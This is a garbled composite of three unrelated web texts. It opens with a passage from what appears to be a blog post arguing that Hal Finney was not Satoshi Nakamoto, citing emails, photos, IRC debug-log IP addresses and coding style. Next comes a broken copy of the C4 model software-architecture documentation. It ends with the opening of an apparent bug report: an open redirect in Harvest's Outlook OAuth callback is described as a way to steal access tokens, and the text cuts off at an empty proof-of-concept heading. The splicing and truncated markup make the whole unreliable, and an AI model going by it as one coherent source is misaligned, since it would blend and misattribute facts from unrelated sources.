evidence, but not the sole evidence, as we'll see shortly.</li><li>Mike's own <a href="https://archive.ph/GNOu8?ref=blog.lopp.net">words on the matter</a>.</li></ul><blockquote>I thought these emails had been published already, because I had forwarded them to a project that was archiving Satoshi's emails years ago. When CipherionX asked me for these emails again, he told me they'd actually never been uploaded anywhere and so I forwarded them once more.<p>The emails are real. As others have noted, I quoted parts of them in various conversations stretching over many years. It would have required vast planning to have set up such a forgery and there is no reason to do so.</p></blockquote><p>“<em>Hal could have scripted the emails and transactions.</em>”</p><p>Sure, but Occam’s Razor applies. Why go to such lengths to sow disinformation in a private communication? It would have been far simpler for Hal to have just responded at a different time rather than leaving this proverbial needle in the haystack that would have never been revealed had Hearn not published the emails.</p><p>“<em>Hal could have been one member of a group.</em>”</p><p>Sure, but Occam's Razor again. As Benjamin Franklin noted: “Three can keep a secret, if two of them are dead.” In all my time researching Satoshi, I've yet to come across any evidence suggesting it was a group. If it was a group, then they all operated on the same sleep schedule, consistent across code commits, emails, and forum posts.</p><figure><img src="https://blog.lopp.net/content/images/2023/10/Satoshi-Public-Activity-Hour-of-Day--2009-2010-.png" alt="" loading="lazy" width="600" height="371" srcset="https://blog.lopp.net/content/images/2023/10/Satoshi-Public-Activity-Hour-of-Day--2009-2010-.png 600w"></figure><p>“<em>The early blockchain history could have been rewritten.</em>”</p><p>Technically true, though 3 hours later Mike sent BTC back &amp; confirmed via email. The timestamp activity of the emails and blockchain line up.</p><p>“<em>Someone else could have been running the race in Hal’s place.</em>”</p><p>As seen above, we have photographic evidence from multiple parties that shows otherwise.</p><h3 id="singularity-summit-2010">Singularity Summit 2010</h3><figure><img src="https://blog.lopp.net/content/images/2023/09/hal_finney_singularity_summit.jpeg" alt="" loading="lazy" width="2000" height="1500" srcset="https://blog.lopp.net/content/images/size/w600/2023/09/hal_finney_singularity_summit.jpeg 600w, https://blog.lopp.net/content/images/size/w1000/2023/09/hal_finney_singularity_summit.jpeg 1000w, https://blog.lopp.net/content/images/size/w1600/2023/09/hal_finney_singularity_summit.jpeg 1600w, https://blog.lopp.net/content/images/size/w2400/2023/09/hal_finney_singularity_summit.jpeg 2400w" sizes="(min-width: 1200px) 1200px"><figcaption>Hal at Singularity Summit</figcaption></figure><p>Hal attended the Singularity Summit in San Francisco on August 14th and 15th of 2010.

Hal was diagnosed with ALS (Amyotrophic Lateral Sclerosis, better known in the US as "Lou Gehrig's Disease"). Since his diagnosis in August of 2009, Hal has physically changed in very obvious ways. His speech has become slow, quiet, and labored. His typing has gone from rapid-fire 120 WPM to a sluggish finger peck. His weekly running (50-60 miles per week in February 2009) stopped being possible in November of 2009, and now Hal gets around in a motorized wheelchair. Eating, always a pleasure before, is now a challenge - much concentration is involved to avoid choking. The most recent and worrisome manifestation of the weakening in Hal's voluntary muscles is his breathing. However - all of these changes have been to Hal's body. The machine that Hal's brain controls through efferent output to interact with the environment. Inside, he is the same brilliant guy I have known for well over half of my life.</blockquote><p>She specifically talks about how Hal can barely type at this point.</p><p>What was Satoshi doing on August 14 and 15 of 2010? Satoshi was quite active, with 4 code check-ins and 17 forum posts. You can view my compilation of all <a href="https://docs.google.com/spreadsheets/d/16uyf7v9xcitr5zy1-WVYx7UiKnasHDcViK_udZyfExg/edit?usp=sharing&amp;ref=blog.lopp.net">publicly known Satoshi activity timestamps here</a>.</p><h3 id="the-ip-address">The IP Address</h3><p>In the initial days of Bitcoin, the client connected to an IRC (Internet Relay Chat) room in order to discover IP addresses of peer nodes to connect and thus join the network. For this reason the debug log becomes crucial for the investigation. It reveals IP addresses of 3 users who were connected to the IRC on January 10, 2009 - the day after Bitcoin launched. As far as we know, Satoshi and Hal were the only two people working on the project during that time.</p><figure><img src="https://blog.lopp.net/content/images/2023/10/hal-debug-log.png" alt="" loading="lazy" width="973" height="729" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/hal-debug-log.png 600w, https://blog.lopp.net/content/images/2023/10/hal-debug-log.png 973w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://web.archive.org/web/20140821141611/http://sourceforge.net/p/bitcoin/mailman/message/21295694/">https://web.archive.org/web/20140821141611/http://sourceforge.net/p/bitcoin/mailman/message/21295694/</a></figcaption></figure><p>The debug log is quite verbose, so I'll point out the relevant lines:</p><p><strong><strong>[x93428606]</strong></strong> is the admin of the IRC channel (Satoshi) and connects from <strong><strong>i=x9342860 gateway/tor/x-bacc5813d7825a9a</strong> </strong>(via tor, a privacy preserving network)</p><p><strong><strong>[uCeSAaG6R9Qidrs] &nbsp;CAddress(207.71.226.132:8333)</strong> - </strong>this is Hal.</p><p><strong><strong>[u4rfwoe8g3w5Tai] &nbsp;new &nbsp;CAddress(68.164.57.219:8333)</strong> - </strong>this is the only other node, thus likely Satoshi.</p><p>What can we determine from these IP addresses?</p><p><strong><strong>Hal Finney’s IP can be identified easily as he has hosted his website at th</strong>e same<strong> IP </strong>address<strong>.</strong> </strong><a href="http://www.plotip.com/ip/207.71.226.132?ref=blog.lopp.net">Data source can be found here</a>.</p><p>IP Address: 207.71.226.132<br>State/Region: California<br>Country: United States<br>Reverse DNS: 226-132.adsl2.netlojix.net<br>Host/ISP: Silicon Beach Communications</p><p>Domains Hosted on IP 207.71.226.132</p><ul><li>finney.org</li><li>privacyca.com</li><li>franforfitness.com</li></ul><p>Could other people have been running nodes?

What I can confidently state is that<strong> their code is quite different</strong>.</p><p>We can compare Hal’s <a href="https://github.com/NakamotoInstitute/RPOW?ref=blog.lopp.net">Reusable Proofs of Work code</a> against the <a href="https://github.com/trottier/original-bitcoin?ref=blog.lopp.net">original Bitcoin client</a> and several differences are immediately apparent.</p><figure><img src="https://blog.lopp.net/content/images/2023/10/hal-finney-satoshi-nakamoto-code-style.png" alt="" loading="lazy" width="1482" height="716" srcset="https://blog.lopp.net/content/images/size/w600/2023/10/hal-finney-satoshi-nakamoto-code-style.png 600w, https://blog.lopp.net/content/images/size/w1000/2023/10/hal-finney-satoshi-nakamoto-code-style.png 1000w, https://blog.lopp.net/content/images/2023/10/hal-finney-satoshi-nakamoto-code-style.png 1482w" sizes="(min-width: 1200px) 1200px"></figure><ol><li>Hal used tabs while Satoshi used spaces (this is a massive never-ending debate between developers)</li><li>Hal preferred his debug statements not to be indented while Satoshi’s maintained indentation with surrounding code</li><li>Hal made comments with block style multi-line markers while Satoshi preferred to create many single-line comments with double slashes</li><li>Hal used snake_case for his function names while Satoshi used camelCase</li></ol><p>There are probably far more differences that are more subtle, but these jumped out from just a few minutes of eyeballing the codebases.</p><h3 id="inconsistencies-in-personas">Inconsistencies in Personas</h3><p>There are a few points about Satoshi's and Hal's perspectives that don't line up, and it would have required a pretty creative writer to keep their personas distinct. For example:</p><figure><blockquote><p lang="en" dir="ltr">Thinking about how to reduce CO2 emissions from a widespread Bitcoin implementation</p>— halfin (@halfin) <a href="https://twitter.com/halfin/status/1153096538?ref_src=twsrc%5Etfw&amp;ref=blog.lopp.net">January 27, 2009</a></blockquote>

</figure><p>Are we to believe that Satoshi had been working on Bitcoin for a year (if not years) but suddenly started being concerned about CO2 emissions?</p><p>It appears that Satoshi Nakamoto only learned about Nick Szabo’s "bit gold" idea from <a href="https://www.mail-archive.com%2Fcryptography@www.mail-archive.com/cryptography@metzdowd.com/msg09975.html?ref=blog.lopp.net">Hal Finney’s first reply</a> to the whitepaper announcement post on the cryptography mailing list.</p><blockquote>I also do think that there is potential value in a form of unforgeable token whose production rate is predictable and can't be influenced by corrupt parties. This would be more analogous to gold than to fiat currencies. Nick Szabo wrote many years ago about what he called "bit gold" and this could be an implementation of that concept.</blockquote><p>Once again, this level of "character development" for alternate personas is a pretty big ask for someone who is not a professional fiction writer.</p><p>Hal Finney was not actually a particularly private person. According to his wife, Hal was a huge privacy advocate and believed everyone had the right to privacy. But privacy is the ability to selectively reveal yourself to the world, and Hal was quite open about his dealings.</p><p>In terms of being privacy conscious, most of the other Satoshi contenders are far stronger candidates with regard to this attribute.</p><h3 id="inconsistencies-in-activity-gaps">Inconsistencies in Activity Gaps</h3><p>Satoshi had 2 lengthy gaps in their public activity:</p><ol><li>From 2009-03-04 16:59:12 UTC to 2009-10-21 1:08:05 UTC</li><li>From 2010-03-24 18:02:55 UTC to 2010-05-16 21:01:44 UTC</li></ol><p>We can see that Hal Finney kept posting during those periods:</p><ul><li><a href="https://www.mail-archive.com/search?a=1&amp;l=cryptography%40metzdowd.com&amp;haswords=%22hal+finney%22&amp;x=0&amp;y=0&amp;from=&amp;subject=&amp;datewithin=1y&amp;date=1%2F1%2F2010&amp;notwords=&amp;o=relevance&amp;ref=blog.lopp.net">Email timestamps</a></li><li><a href="https://www.lesswrong.com/users/halfinney?ref=blog.lopp.net">LessWrong timestamps</a></li></ul><p>While this doesn't prove anything, it's yet another difference in the characteristics of Hal and Satoshi.</p><h3 id="hal-was-a-legend-just-not-that-legend">Hal was a Legend, Just not That Legend</h3><p>We should all aspire to be like Hal Finney.</p><figure><blockquote><p lang="en" dir="ltr">1) I recommend that every Bitcoin enthusiast reads Satoshi's original announcement email thread in its entirety: <a href="https://t.co/wt0X5w2ulc?ref=blog.lopp.net">https://t.co/wt0X5w2ulc</a></p>— Jameson Lopp (@lopp) <a href="https://twitter.com/lopp/status/721701694518751232?ref_src=twsrc%5Etfw&amp;ref=blog.lopp.net">April 17, 2016</a></blockquote>

Indeed, proving a negative is often an impossible task.

                            The C4 model is...

                                The C4 model is an easy to learn, developer friendly approach to software architecture diagramming.
                                Good software architecture diagrams assist with communication inside/outside of software development/product teams,
                                efficient onboarding of new staff, architecture reviews/evaluations, risk identification (e.g. <a href="https://riskstorming.com/" target="_blank">risk-storming</a>),
                                threat modelling, etc.

        <div>
                <h2>Introduction</h2>
                <p>
                    Ask somebody in the building industry to visually communicate the architecture of a building and you'll be presented with site plans, floor plans, elevation views, cross-section views and detail drawings.
                    In contrast, ask a software developer to communicate the software architecture of a software system using diagrams and you'll likely get a confused mess of boxes and lines ...
                    inconsistent notation (colour coding, shapes, line styles, etc), ambiguous naming, unlabelled relationships, generic terminology, missing technology choices, mixed abstractions, etc.
                </p>

                

                <p>
                    As an industry, we do have the Unified Modeling Language (UML), ArchiMate and SysML,
                    but asking whether these provide an effective way to communicate software architecture is often irrelevant because many teams have already thrown them out in favour of much simpler "boxes and lines" diagrams.
                    Abandoning these modelling languages is one thing but, perhaps in the race for agility, many software development teams have lost the ability to communicate visually.
                </p>

                <h3>Maps of your code</h3>
                <p>
                    The C4 model was created as a way to help software development teams describe and communicate software architecture, both during up-front design sessions and when retrospectively documenting an existing codebase.
                    It's a way to create maps of your code, at various levels of detail, in the same way you would use something like Google Maps to zoom in and out of an area you are interested in. 
                </p>

                            Level 1: A <b>System Context</b> diagram provides a starting point, showing how the software system in scope fits into the world around it.

                            Level 2: A <b>Container</b> diagram zooms into the software system in scope, showing the high-level technical building blocks.
                        </p>
                    </div>

                        <p>
                            Level 3: A <b>Component</b> diagram zooms into an individual container, showing the components inside it.
                        </p>
                    </div>
                    <div>

                        <p>
                            Level 4: A <b>code</b> (e.g. UML class) diagram can be used to zoom into an individual component, showing how that component is implemented.
                        </p>
                    </div>
                </div>

                <p>
                    The C4 model is an "abstraction-first" approach to diagramming software architecture, based upon abstractions that reflect how
                    software architects and developers think about and build software. The small set of abstractions and diagram types makes the C4 model
                    easy to learn and use.
                    Please note that you don't need to use all 4 levels of diagram; only those that add value - the System Context and Container diagrams are sufficient for many software development teams.

                <h2>Abstractions</h2>
                <p>
                    In order to create these maps of your code, we first need a common set of abstractions to create a ubiquitous language that we can use to describe the static structure of a software system.
                    A <b>software system</b> is made up of one or more <b>containers</b> (applications and data stores),
                    each of which contains one or more <b>components</b>,
                    which in turn are implemented by one or more <b>code elements</b> (classes, interfaces, objects, functions, etc).
                    And <b>people</b> may use the software systems that we build.
                </p>

                

                <p>
                    <a href="https://c4model.com/img/abstractions.png"><img src="https://c4model.com/img/abstractions.png" alt="Abstractions"></a>
                </p>
                

                <h3>Person</h3>
                <p>
                    A person represents one of the human users of your software system (e.g. actors, roles, personas, etc).
                </p>

                <h3>Software System</h3>
                <p>
                    A software system is the highest level of abstraction and describes something that delivers value to its users, whether they are human or not. This includes the software system you are modelling, and the other software systems upon which your software system depends (or vice versa).
                    In many cases, a software system is "owned by" a single software development team.
                </p>

                <h3>Container <span>(applications and data stores)</span></h3>
                <p>
                    Not Docker! In the C4 model, a container represents an <b>application</b> or a <b>data store</b>. A container is something that needs to
                    be running in order for the overall software system to work. In real terms, a container is something like:
                </p>
                
                <ul>
                    <li><b>Server-side web application</b>: A Java EE web application running on Apache Tomcat, an ASP.NET MVC application running on Microsoft IIS, a Ruby on Rails application running on WEBrick, a Node.js application, etc.</li>
                    <li><b>Client-side web application</b>: A JavaScript application running in a web browser using Angular, Backbone.JS, jQuery, etc.</li>
                    <li><b>Client-side desktop application</b>: A Windows desktop application written using WPF, an OS X desktop application written using Objective-C, a cross-platform desktop application written using JavaFX, etc.</li>
                    <li><b>Mobile app</b>: An Apple iOS app, an Android app, a Microsoft Windows Phone app, etc.</li>
                    <li><b>Server-side console application</b>: A standalone (e.g. "public static void main") application, a batch process, etc.</li>
                    <li><b>Serverless function</b>: A single serverless function (e.g. Amazon Lambda, Azure Function, etc).</li>
                    <li><b>Database</b>: A schema or database in a relational database management system, document store, graph database, etc such as MySQL, Microsoft SQL Server, Oracle Database, MongoDB, Riak, Cassandra, Neo4j, etc.</li>
                    <li><b>Blob or content store</b>: A blob store (e.g. Amazon S3, Microsoft Azure Blob Storage, etc) or content delivery network (e.g. Akamai, Amazon CloudFront, etc).</li>

                    A container is essentially a context or boundary inside which some code is executed or some data is stored.
                    And each container is a separately deployable/runnable thing or runtime environment, typically (but not always) running in its own process space.
                    Because of this, communication between containers typically takes the form of an inter-process communication.
                </p>

                <h3>Component</h3>
                <p>
                    The word "component" is a hugely overloaded term in the software development industry, but in this context a component is a grouping of related functionality encapsulated behind a well-defined interface.
                    If you're using a language like Java or C#, the simplest way to think of a component is that it's a collection of implementation classes behind an interface. Aspects such as how those components are packaged (e.g. one component vs many components per JAR file, DLL, shared library, etc) is a separate and orthogonal concern.
                </p>
                <p>
                    An important point to note here is that all components inside a container typically execute in the same process space.
                    <b>In the C4 model, components are not separately deployable units.</b>

                            A System Context diagram is a good starting point for diagramming and documenting a software system,
                            allowing you to step back and see the big picture. Draw a diagram showing your system
                            as a box in the centre, surrounded by its users and the other systems that it interacts with.
                        </p>

                            Detail isn't important here as this is your zoomed out view showing a big picture of the system landscape.
                            The focus should be on people (actors, roles, personas, etc) and software systems rather than technologies,
                            protocols and other low-level details. It's the sort of diagram that you could show to non-technical people.

                            Once you understand how your system fits in to the overall IT environment, a really useful next step is to zoom-in to the system boundary with a Container diagram.
                            A "container" is something like a server-side web application, single-page application, desktop application, mobile app, database schema, file system, etc.
                            Essentially, a container is a separately runnable/deployable unit (e.g. a separate process space) that executes code or stores data.
                        </p>

                        <p>
                            The Container diagram shows the high-level shape of the software architecture and how responsibilities
                            are distributed across it. It also shows the major technology choices and how the containers communicate
                            with one another. It's a simple, high-level technology focussed diagram that is useful for
                            software developers and support/operations staff alike.

                            The C4 model provides a static view of a <b>single software system</b> but, in the real-world, software systems never live in isolation.
                            For this reason, and particularly if you are responsible for a collection/portfolio of software systems,
                            it's often useful to understand how all of these software systems fit together within a given enterprise, organisation, department, etc.
                            Essentially this is a map of the software systems within the chosen scope,
                            with a C4 drill-down for each software system of interest.

                            From a practical perspective, a system landscape diagram is really just a system context diagram without a specific focus on a particular software system.

                            This dynamic diagram is based upon a <a href="https://en.wikipedia.org/wiki/Communication_diagram">UML communication diagram</a>
                            (previously known as a "UML collaboration diagram"). It is similar to a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">UML sequence diagram</a>
                            although it allows a free-form arrangement of diagram elements with numbered interactions to indicate ordering.

                        <p>
                            A deployment diagram allows you to illustrate how instances of software systems and/or containers in the static model are deployed on to the infrastructure within a given <b>deployment environment</b>
                            (e.g. production, staging, development, etc).
                            It's based upon a <a href="https://en.wikipedia.org/wiki/Deployment_diagram">UML deployment diagram</a>.

                        <p>
                            A <b>deployment node</b> represents where an instance of a software system/container is running;
                            perhaps physical infrastructure (e.g. a physical server or device),
                            virtualised infrastructure (e.g. IaaS, PaaS, a virtual machine),
                            containerised infrastructure (e.g. a Docker container),
                            an execution environment (e.g. a database server, Java EE web/application server, Microsoft IIS), etc.
                            Deployment nodes can be nested.
                        </p>

                        <p>
                            You may also want to include <b>infrastructure nodes</b> such as DNS services, load balancers, firewalls, etc.
                        </p>

                        <p>
                            Feel free to use icons provided by Amazon Web Services, Azure, etc to complement your deployment diagrams
                            ... just make sure any icons you use are included in your diagram key/legend.

                <h2>Notation</h2>
                <p>
                    The C4 model is <b>notation independent</b>, and doesn't prescribe any particular notation.
                    As a starting point though, a simple notation that works well on whiteboards, paper, sticky notes, index cards and a variety of diagraming tools is as follows.
                </p>

                <div>

                <p>
                    You can then use colour and shapes to supplement the diagram, either to add additional information or simply to make the diagram more aesthetically pleasing.

                <h3>C4 and UML</h3>
                <p>
                    Although the example diagrams above are created using a "boxes and lines" notation,
                    the core diagrams can be illustrated using UML with the appropriate use of packages, components and stereotypes. The resulting UML diagrams do tend to lack the same degree of descriptive text though, because adding such text isn't possible (or easy) with some UML tools.
                </p>
                <p>
                    Here are three examples of a System Context, Container and Component diagram for comparison.

                <h3>C4 and ArchiMate</h3>

                <p>
                    See <a href="https://www.archimatetool.com/blog/2020/04/18/c4-model-architecture-viewpoint-and-archi-4-7/">C4 Model, Architecture Viewpoint and Archi 4.7</a> for details of how to create C4 model diagrams with ArchiMate.
                </p>

                <h3>Diagram key/legend</h3>
                <p>
                    Any notation used should be as self-describing as possible, but <b>all diagrams should have a key/legend</b> to make the notation explicit.
                    This applies to diagrams created with notations such as UML, ArchiMate and SysML too, as not everybody will know the notation being used.
                </p>

                <h3>Notation, notation, notation</h3>
                <p>
                    Although the C4 model is an abstraction-first approach and notation independent, you still need to ensure that your diagram notation makes sense,
                    and that the diagrams are comprehensible.
                    A good way to think about this is to ask yourself whether each diagram can stand alone, and be (mostly) understood without a narrative.
                    You can use this short <a href="https://c4model.com/review">software architecture diagram review checklist</a> to help.
                    And here are some recommendations related to notation.

                        <h4>Diagrams</h4>
                        <ul>
                            <li>Every diagram should have a title describing the diagram type and scope (e.g. "System Context diagram for My Software System").</li>
                            <li>Every diagram should have a key/legend explaining the notation being used (e.g. shapes, colours, border styles, line types, arrow heads, etc).</li>
                            <li>Acronyms and abbreviations (business/domain or technology) should be understandable by all audiences, or explained in the diagram key/legend.</li>
                        </ul>
                    </div>
                    <div>
                        <h4>Elements</h4>
                        <ul>
                            <li>The type of every element should be explicitly specified (e.g. Person, Software System, Container or Component).</li>
                            <li>Every element should have a short description, to provide an "at a glance" view of key responsibilities.</li>
                            <li>Every container and component should have a technology explicitly specified.</li>
                        </ul>
                    </div>
                    <div>
                        <h4>Relationships</h4>
                        <ul>
                            <li>Every line should represent a unidirectional relationship.</li>
                            <li>Every line should be labelled, the label being consistent with the direction and intent of the relationship (e.g. dependency or data flow). Try to be as specific as possible with the label, ideally avoiding single words like, "Uses".</li>
                            <li>Relationships between containers (typically these represent inter-process communication) should have a technology/protocol explicitly labelled.</li>
                        </ul>
                    </div>
                </div>

                <h3>Alternative visualisations</h3>
                <p>
                    Finally, don't feel that you need to always use a traditional "boxes and arrows" diagram.
                    Although this is usually the default approach, there are other, often interactive, visualisations
                    that can be used to show the same C4 model abstractions in very different ways.

                        <h4>What's the background behind the C4 model?</h4>
                        <p>
                            The C4 model was created by <a href="http://simonbrown.je/">Simon Brown</a>, who started teaching people about software architecture,
                            while working as a software developer/architect in London. Part of Simon's training course was a design exercise, where groups of people
                            were given some requirements, asked to do some design, and to draw some diagrams to express that design.
                        </p>
                        <p>
                            Although this was a design focussed exercise, the wide variety of diagrams made it evident that the visualisation of ideas was a skill that most people sorely lacked.
                            The C4 model is essentially a formalisation of how Simon used to visualise software architecture, which has evolved over the years.   
                        </p>
                    </div>
                    <div>
                        <h4>What's the inspiration behind the C4 model?</h4>
                        <p>
                            The C4 model was inspired by the <a href="https://en.wikipedia.org/wiki/Unified_Modeling_Language">Unified Modeling Language</a> and
                            the <a href="https://en.wikipedia.org/wiki/4%2B1_architectural_view_model">4+1 model for software architecture</a>.
                            In summary, you can think of the C4 model as a simplified version of the underlying concepts, designed to
                            (1) make it easier for software developers to describe and understand how a software system works and
                            (2) to minimise the gap between the software architecture model/description and the source code.
                        </p>
                        <p>
                            The roots of the C4 model, and the various diagram types within it, can be traced back to somewhere in the region of 2006,
                            although the "C4" name came much later, around the end of 2011. It was created during a time where
                            teams, influenced by the agile movement, were less than enthusiastic about using UML.

                        <h4>Isn't the C4 model a step backwards? Why are you reinventing UML? Why not just use UML?</h4>
                        <p>
                            Whether you see the C4 model as a step forwards or a step backwards depends upon where you are.
                            If you're using UML (or SysML, ArchiMate, etc) and it's working for you, stick with it.
                            Unfortunately, UML usage seems to be in decline, and many teams have reverted to using ad hoc boxes and lines diagrams once again.
                            Given that many of those teams don't want to use UML (for various reasons), the C4 model helps introduce some structure and discipline into the way software architecture is communicated.
                            For many teams, the C4 model is sufficient. And for others, perhaps it's a stepping stone to UML.

                        <h4>How many people use the C4 model?</h4>
                        <p>
                            The honest answer is that nobody knows. Simon has personally taught the C4 model to somewhere over 10,000 people in more than 30 countries;
                            with conference talks, videos, books and articles reaching many more than this.
                            Other people are also teaching, speaking and writing about the C4 model too.
                            It's definitely being used though, in organisations ranging from startups to global household names.

                        <h4>Why "container"?</h4>
                        <p>
                            Terms like "process", "application", "app", "server", "deployable unit", etc all have associated implications,
                            so the name "container" was chosen as a generic way to describe something in which components live.
                            From one perspective, it's unfortunate that containerisation has become popular, because many software developers now associate the term "container" with Docker.
                            From another perspective though, there is sometimes a nice parity between a container in the C4 model and an infrastructure (e.g. Docker) container.
                        </p>
                        <p>
                            While many teams successfully use the C4 model as is, feel free to change the terminology if needed.
                        </p>

                        <h4>Can we change the terminology?</h4>
                        <p>
                            This terminology (context, containers, components and code) works for many organisations and many types of software.
                            However, sometimes an organisation will have an existing terminology that people are already familiar with.
                            Or perhaps "components" and "classes" don't easily map on to the technology being used (e.g. functional languages often use the terms "module" and "function").
                        </p>
                        <p>
                            Feel free to modify the terminology that you use to describe software architecture at different levels of abstraction.
                            Just make sure that everybody explicitly understands it.

                        <h4>How do you model microservices and serverless?</h4>
                        <p>
                            Broadly speaking, there are two options for diagramming microservices when using the C4 model, although it depends what you mean by "microservice".
                        </p>

                        <p>
                            <b>Approach 1: Each "microservice" is owned by a separate team</b>
                            <br>
                            If your software system has a dependency upon a number of microservices that are outside of your control (e.g. they are owned and/or operated by a separate team), model these microservices as external software systems, that you can't see inside of.
                        </p>

                        <p>
                            <b>Approach 2: A single team owns multiple "microservices"</b>
                        </p><p>
                            Imagine that you have an API app (e.g. Spring Boot, ASP.NET MVC, etc) that reads/writes to a relational database schema.
                            Regardless of whether you consider the term "microservice" to refer to just the API app, or the combination of the API app and database schema ...
                            if the microservices are a part of a software system that you are building (i.e. you own them), model every deployable thing as a container.
                            In other words, you'd show two containers: the API app, and the database schema.
                            Feel free to draw a box around these two containers to indicate they are related/grouped.
                        </p>

                        <p>
                            The same is true for serverless functions/lambdas/etc; treat them as software systems or containers based upon ownership.
                        </p>

                        <h4>How do you diagram large and complex software systems?</h4>
                        <p>
                            Even with a relatively small software system, it's tempting to try and include the entire story on a single diagram. For example, if you have a web application, it seems logical to create a single component diagram that shows all of the components that make up that web application. Unless your software system really is that small, you're likely to run out of room on the diagram canvas or find it difficult to discover a layout that isn't cluttered by a myriad of overlapping lines. Using a larger diagram canvas can sometimes help, but large diagrams are usually hard to interpret and comprehend because the cognitive load is too high. And if nobody understands the diagram, nobody is going to look at it.
                        </p>
                        <p>
                            Instead, don't be afraid to split that single complex diagram into a larger number of simpler diagrams, each with a specific focus around a business area, functional area, functional grouping, bounded context, use case, user interaction, feature set, etc. The key is to ensure that each of the separate diagrams tells a different part of the same overall story, at the same level of abstraction.

                            Due to the hierarchical nature of the C4 model, each diagram will change at a different rate.

                            <li><b>Container diagram</b>: Unless you're building a software system that makes heavy use of microservices or serverless lambdas/functions/etc, the container diagram will also change relatively slowly.</li>

                            The focus of the C4 model is the static structures that make up a software system, at different levels of abstraction.

                            Although existing notations such as UML, ArchiMate and SysML already exist, many software development teams don't seem to use them.
                            Often this is because teams don't know these notations well enough, perceive them to be too complicated, think they are not compatible with agile approaches or don't have the required tooling.
                        </p>

                        <p>
                            If you are already successfully using one of these notations to communicate software architecture and it's working, stick with it. If not, try the C4 model.
                            And don't be afraid to supplement the C4 diagrams with UML state diagrams, timing diagrams, etc if you need to.

                            Yes, many teams do, and the C4 model is compatible with the <a href="http://arc42.org/">arc42 documentation template</a> as follows.

                        <h4>Does the C4 model imply a design process or team structure?</h4>
                        <p>
                            A common misconception is that a team's design process should follow the levels in the C4 model hierarchy, perhaps with different people on the team being responsible for different levels of diagrams.
                            For example, a business analyst creates the system context diagram, the architect creates the container diagram, while the developers look after the remaining levels of detail.
                        </p>
                        <p>
                            Although you can certainly use the C4 model in this way, this is not the intended or recommended usage pattern.
                            The C4 model is just a way to describe a software system, from different levels of abstraction, and it implies nothing about the process of delivering software.

                        <p>
                            The C4 model is really designed to model a software system, at various levels of abstraction.
                            To document a library, framework or SDK, you might be better off using something like UML.
                            Alternatively, you could use the C4 model to describe a usage example of your framework, library or SDK; perhaps using colour coding to signify which parts of the software system are bespoke vs those provided for you. 
                        </p>

                        <h4>Web applications; one container or two?</h4>
                        <p>
                            If you're building a server-side web application (e.g. Spring MVC, ASP.NET, Ruby on Rails, Django, etc) that is predominantly generating static HTML content, then that's a single container.
                            If there's a significant quantity of JavaScript being delivered by the server-side web application (e.g. a single-page application built using Angular), then that's two containers.
                            <a href="https://static.structurizr.com/workspace/36141/diagrams/Containers.png">Here's an example</a>.
                        </p>
                        <p>
                            Although, at deployment time, the server-side web application includes both the server-side and client-side code, treating the client and server as two separate containers makes it explicit that these are two separate process spaces, communicating via an inter-process/remote communication mechanism (e.g. JSON/HTTPS).
                            It also provides a basis for zooming in to each container separately to show the components inside them.
                        </p>
                    </div>
                </div>

                    <div>
                        <h4>Should the lines represent dependencies or data flow?</h4>
                        <p>
                            This is your choice. Sometimes diagrams work better showing dependency relationships (e.g. uses, reads from, etc),
                            and sometimes data flow (e.g. customer update events) works better. Whichever you choose, make sure that the description of the line matches the direction of the arrow.
                        </p>
                        <p>
                            It's also worth remembering that most relationships can be expressed either way, and the more explicit you can be, the better.
                            For example, describing a relationship as "sends customer update events to" can be more descriptive than simply "customer update events".
                        </p>

                        <h4>Is a Java JAR, C# assembly, DLL, module, etc a container?</h4>
                        <p>
                            Typically not.
                            A container is a runtime construct, like an application; whereas Java JAR files, C# assemblies, DLLs, modules, etc are used to organise the code within those applications.
                        </p>
                    </div>
                    <div>
                        <h4>Is a Java JAR, C# assembly, DLL, module, package, namespace, folder etc a component?</h4>
                        <p>
                            Perhaps but, again, typically not.
                            The C4 model is about showing the runtime units (containers) and how functionality is partitioned across them (components), rather than organisational units such as Java JAR files, C# assemblies, DLLs, modules, packages, namespaces or folder structures. 
                        </p>
                        <p>
                            Of course, there may be a one-to-one mapping between these constructs and a component; e.g. if you're building a hexagonal architecture, you may create a single Java JAR file or C# assembly per component.
                            On the other hand, a single component might be implemented using code from a number of JAR files, which is typically what happens when you start to consider third-party frameworks/libraries, and how they become embedded in your codebase.
                        </p>
                    </div>
                </div>

                    <div>
                        <h4>Should you include message buses, API gateways, service meshes, etc?</h4>
                        <p>
                            If you have two services, A and B, that communicate by sending a message via a message bus (irrespective of topics, queues, p2p, pub/sub, etc) or another intermediary (e.g. an API gateway or service mesh), you have a couple of options.
                            The first option is to show service A sending a message to the intermediary, and the intermediary subsequently forwarding that message to service B.
                            While accurate, the "hub and spoke" nature of the diagram tends to obscure the notion that there's coupling between the message producer and consumer.
                        </p>
                        <p>
                            The other approach is to omit the intermediary, and instead use notation (e.g. a textual description, colour coding, line style, etc) to signify that the interaction between service A and B happens via an intermediary.
                            This approach tends to result in diagrams that tell a clearer story.

                        <h4>Should data storage services be shown as software systems or containers?</h4>
                        <p>
                            A frequently asked question is whether services like Amazon S3, Amazon RDS, Azure SQL Database, content delivery networks, etc should be shown as software systems or containers. After all, these are external services that most of us don't own or run ourselves.
                        </p>
                        <p>
                            If you're building a software system that is using Amazon S3 for storing data, it's true that you don't run S3 yourself, but you do have ownership and responsibility for the buckets you are using. Similarly with Amazon RDS, you have (more or less) complete control over any database schemas that you create. For this reason, treat them as containers because they are an integral part of your software architecture, although they are hosted elsewhere.
                        </p>

                        <h4>Is the C4 model universally applicable?</h4>
                        <p>
                            The C4 model was designed to help describe, document, and diagram custom-built, bespoke software systems.
                            From this perspective, the C4 model can be used to describe a variety of software architectures (monolithic or distributed), built in a variety of programming languages, deployed on a variety of platforms (on-premises or cloud).
                        </p>
                        <p>
                            Solutions that are perhaps less suited to the C4 model include embedded systems/firmware, and solutions that reply on heavy customization rather than bespoke development (e.g. SAP and Salesforce).
                            Even with these solutions, you still may find the System Context and Container diagrams useful.

  <h2 id="summary">Summary</h2>
<p>Harvest is a time-tracking software that allows users to connect their Outlook Calendar through OAuth. After a successful grant of permission, the user is redirected to <a href="https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback">https://outlook-integration.harvestapp.com/auth/outlook-calendar/callback</a> which further redirects the user to the URL provided within the state. This leads to an open redirect which can be used to steal access tokens through an implicit grant.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
